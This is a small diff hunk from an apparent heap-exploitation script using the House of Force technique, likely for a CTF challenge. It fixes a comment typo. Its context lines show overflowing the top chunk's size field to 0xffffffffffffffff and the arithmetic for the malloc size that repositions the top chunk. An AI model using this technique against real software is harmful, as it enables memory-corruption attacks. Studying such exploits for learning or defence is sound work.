@@ -39,7 +39,7 @@ pause()
 
 change(0, 0x40, b'a'* (0x30) + p64(0) + p64(0xffffffffffffffff)) # Overflow fields prev_size and size of current top chunk
 
-### evil_size is the size to be passed to `malloc()``
+### evil_size is the size to be passed to `malloc()`
 
 # new_top = old_top + evil_size + 2*sizeof(long)
 # evil_size + 2*sizeof(long) = new_top - old_top
